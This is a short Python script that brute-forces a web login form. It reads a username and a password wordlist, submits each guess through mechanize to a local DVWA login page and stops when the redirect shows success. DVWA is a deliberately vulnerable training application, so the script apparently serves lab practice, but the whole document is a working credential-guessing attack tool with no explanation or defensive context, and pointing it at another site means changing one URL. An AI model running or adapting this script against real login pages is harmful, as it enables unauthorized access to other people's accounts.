import mechanize
import argparse
parser = argparse.ArgumentParser(description="")
parser.add_argument("-u", "--username", metavar="<username>", dest="username",default=None, help="Specify a username to crack")
parser.add_argument("-w", "--wordlist", metavar="<wordlist>", dest="wordlist",
                            default=None, help="Specify a wordlist path")
args = parser.parse_args()
if not args.username:
            print("Missing '-u' or '--username' argument!\n")
            exit()

if not args.wordlist:
	print ("Missing '-w' or '--wordlist' argument!\n")
	exit()

filename  = args.wordlist
try:
	wordlist = open(filename,"r")
except :
	print ("wordlist not found\n")
	exit()	       
b = mechanize.Browser()
url = "http://localhost/dvwa/login.php"

for password in wordlist:
	response = b.open(url)
	b.select_form(nr=0)
	b.form['username'] = args.username
	b.form['password'] = password.strip()
	b.method = "POST"
	response = b.submit()
	if response.geturl() == "http://localhost/dvwa/index.php":
	 	print ("The password found: "  +  password.strip())
	 	break
		


